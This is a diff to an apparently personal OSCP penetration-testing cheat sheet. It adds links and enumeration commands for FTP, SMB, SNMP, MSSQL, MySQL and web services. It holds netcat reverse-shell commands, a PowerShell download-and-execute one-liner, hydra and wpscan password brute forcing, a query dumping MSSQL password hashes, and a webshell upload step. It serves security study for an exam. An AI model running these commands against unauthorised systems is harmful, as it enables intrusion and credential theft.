@@ -26,14 +26,17 @@
 - https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/active_directory.md
 
 # Priesc specific resources
-- https://gist.github.com/ssstonebraker/fb2c43ad37a8a704bf952954ce95ec40
-- https://notchxor.github.io/oscp-notes/4-win-privesc/1-initial/
-- https://guide.offsecnewbie.com/privilege-escalation/linux-pe
-- https://0xy37.medium.com/linux-pe-cheatsheet-oscp-prep-9affaebd0f0e
-- https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/windows_enumeration_and_privilege_escalation.md
-- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
-- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
-- 
+1. (best)https://exploit-notes.hdks.org/exploit/linux/post-exploitation/linux-backdoors/
+2. https://gist.github.com/ssstonebraker/fb2c43ad37a8a704bf952954ce95ec40
+3. https://notchxor.github.io/oscp-notes/4-win-privesc/1-initial/
+4. https://guide.offsecnewbie.com/privilege-escalation/linux-pe
+5. https://0xy37.medium.com/linux-pe-cheatsheet-oscp-prep-9affaebd0f0e
+6. https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/windows_enumeration_and_privilege_escalation.md
+7. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+8. https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+
+# all about shells
+https://github.com/r4hn1/Pentesting-Cheatsheet
 
 # writeups
 - https://v3ded.github.io/categories/
@@ -52,14 +55,15 @@
 ## Connection
 ```bash
 #attacker
-root@kali:  rlwrap nc -nlvp 666
+root@kali:  rlwrap nc -nlvp 4444
 #target
 nc -nv 10.10.0.25 666 -e /bin/bash
 nc.exe 192.168.100.113 4444 –e cmd.exe
-
 ```
 
 ## Enumeration
+1. https://github.com/oncybersec/oscp-enumeration-cheat-sheet?tab=readme-ov-file#ssh-22tcp
+2. https://docs.gorigorisensei.com/ports-enum/port-80
 
 ### Port Scan
 ```bash
@@ -71,16 +75,53 @@ sudo nmap -sS -Pn -A x.x.x.x
 sudo nmap -sU -p- --max-retries 0 --min-rate 500 x.x.x.x  
 #output to file
 sudo nmap -sC -sV x.x.x.x -oN scanresult.txt
-
-#rustscan
 ```
+```bash
+#rustscan
 #quick
 rustscan -a IP -r 1-65535
 #detailed nmap - Service Scan, Version Scan, OS Detection
 rustscan -a IP -r 1-65535 -- -A
-
+```
+```bash
+#Autorecon
+sudo autorecon 192.168.175.98
+# Scan multiple targets
+sudo autorecon -o enumeration $ip1 $ip2 $ip3 $ip4
+```
+```bash
 #powershell's port scan
 powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts x.x.x.x"
+```
+
+### FTP (21)
+- A few common passwords or usernames (if unknown) such as admin, administrator, root, ftpuser, test etc. should be tried if anonymous authentication is disabled on the remote FTP server
+- common FTP command (https://steflan-security.com/ftp-enumeration-guide/)
+```bash
+#FTP Enum
+nmap –script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1
+
+#use FileZilla
+#or use browser
+ftp://X.X.X.X/ 
+
+ftp X.X.X.X
+#provide anonymous as username
+#provide any passowrd
+
+#FTP connect
+ftp IP -p <<passive mode port no.>>
+
+#recursive download all files
+wget -r ftp://username:passsword@IP
+
+#bruteforce credentials
+hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ftp://X.X.X.X
+```
+
+### SSH (22)
+```bash
+nc $IP 22
 ```
 
 ### Web scan (80 - http or 443 - https)
@@ -88,11 +129,23 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 #Nikto
 nikto -h x.x.x.x
 
-#Gobuster
+#Directory Brute Force (1)
 gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20
 gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -t 20
 gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt-t 20 -x .txt,.php
 gobuster dir -u https://10.129.168.90 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+#Directory Brute Force (2)
+gobuster dir -u $url -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -s "200,204,301,302,307,403,500" -k -t 16 -o "tcp_port_protocol_gobuster.txt"  
+
+python3 /opt/dirsearch/dirsearch.py -u $url -t 16 -e txt,html,php,asp,aspx,jsp -f -x 403 -w /usr/share/seclists/Discovery/Web-Content/common.txt --plain-text-report="tcp_port_protocol_dirsearch.txt"
+
+Dirbuster (GUI): only perform extension brute force - disable 'Brute Force Dirs'
+
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -t 16 $url/FUZZ 2>&1 | tee "tcp_port_http_wfuzz.txt"
+
+# Directory brute force recursively with max depth = 2
+python3 /opt/dirsearch/dirsearch.py -u $url/apps/ -t 16 -e txt,html,php -f -x 403 -r -R 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt --plain-text-report="tcp_port_protocol_dirsearch_apps.txt"
 
 #Wfuzz
 wfuzz -w /usr/share/seclists/Discovery/Web_Content/common.txt -- hc 400,404,500 http://x.x.x.x/FUZZ
@@ -107,11 +160,29 @@ wpscan --url https://x.x.x.x
 #bruteforce wpscan
 wpscan --url http://x.x.x.x -- wordlist /usr/share/wordlists/SecLists/s/best1050.txt -- username admin -- threads 10
 ```
-
 #### All other web apps
 - https://docs.gorigorisensei.com/web-apps 
 
-### SMB Enumeration (445 - SMB)
+### RPC (111, 135)
+```bash
+# List all registered RPC programs
+rpcinfo -p $ip
+
+# Provide compact results
+rpcinfo -s $ip
+```
+
+```bash
+rpcclient -U "" -N $ip
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+```
+
+### SMB Enumeration (139, 445)
 - https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/
 - SMB can run: directly over TCP (port 445) OR via Netbios API (137/139)
 - always check autorecon scans results on the SMB version to find exploitation
@@ -119,12 +190,26 @@ wpscan --url http://x.x.x.x -- wordlist /usr/share/wordlists/SecLists/s/best1050
 ```bash
 #checking Null session and check share listing
 smbmap -H x.X.X.x
-smbclient -L \\\\X.X.X.x -N
-smbclient \\\\x.x.x.x\\[sharename]
+smbclient -L \\\\X.X.X.x -U '' -N
+smbclient \\\\x.x.x.x\\[sharename e.g.wwwroot]
+
+#Enumerate shares
+nmap --script smb-enum-shares -p 445 $ip
 
 #account login
 smbmap -u username -p password -H <target-ip>
 smbmap -u username -p password -H <target-ip> -x 'ipconfig'
+```
+
+```bash
+#steps to inspect samba version without metasploit
+# https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#manual-inspection
+
+#at Terminal A
+ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 
+
+#at Terminal B
+echo exit | smbclient -L [IP] 
 ```
 
 ### SMB commands
@@ -141,9 +226,62 @@ smb> put shell.aspx
 access to https://example.com/path/to/smb/share/shell.aspx
 ```
 
-### SNMP Enumeration
+### SNMP (161)
 ```bash
-snmpwalk -c public -v1 x.x.x.x
+# Enumerate entire MIB tree
+snmpwalk -c public -v1 -t 10 $ip
+
+# Enumerate Windows users
+snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25
+
+# Enumerate running Windows processes
+snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
+
+# Enumerate open TCP ports
+snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3
+
+# Enumerate installed software
+snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2
+```
+### MSSQL (1433)
+```bash
+# MSSQL shell
+mssqlclient.py -db msdb hostname/sa:password@$ip
+
+# List databases
+SELECT name FROM master.dbo.sysdatabases
+
+# List tables
+SELECT * FROM <database_name>.INFORMATION_SCHEMA.TABLES
+
+# List users and password hashes
+SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, sp.create_date, sp.modify_date, CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id WHERE sp.type NOT IN ('G', 'R') ORDER BY sp.name
+```
+
+### MySQL (3306)
+```bash
+# Version detection + NSE scripts
+nmap -Pn -sV -p 3306 --script="banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_3306_mysql_nmap.txt" $ip
+MySQL shell
+
+mysql --host=$ip -u root -p
+MySQL system variables
+
+SHOW VARIABLES;     
+Show privileges granted to current user
+
+SHOW GRANTS;
+Show privileges granted to root user
+
+# Replace 'password' field with 'authentication_string' if it does not exist
+SELECT user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv FROM mysql.user WHERE user = 'root';
+Exact privileges
+
+SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;     
+Enumerate file privileges (see here for discussion of file_priv)
+
+SELECT user FROM mysql.user WHERE file_priv='Y';
+
 ```
 
 ### any other protocol Emuneration
@@ -1160,6 +1298,9 @@ proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p ''
 
 ## compiling windows exploit on kali
 ```bash
+#compile C code
+gcc -o syncbreeze_exploit.exe exploit.c
+
 #compile 32 bit
 apt install mingw-w64
 i686-w64-mingw32-gcc /usr/share/exploitdb/exploits/windows/dos/42341.c -o syncbreeze_exploit.exe -lws2_32
